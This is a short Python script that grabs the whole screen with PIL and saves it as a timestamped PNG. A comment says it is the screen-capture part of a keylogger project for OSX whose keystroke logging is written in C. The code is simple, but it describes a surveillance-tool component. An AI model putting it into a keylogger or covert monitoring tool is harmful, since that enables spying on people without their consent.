import time
from PIL import ImageGrab

#Since there is no hook substitute for OSX, we have chosen to develop the keylogger in C,
# However, in order to keep the screen capture functionality, we have chosen to implement
# this functionality in python
fname = "../Images/"+time.strftime('%Y_%m_%d_%H_%M_%S')+".png"
ImageGrab.grab().save(fname, "PNG")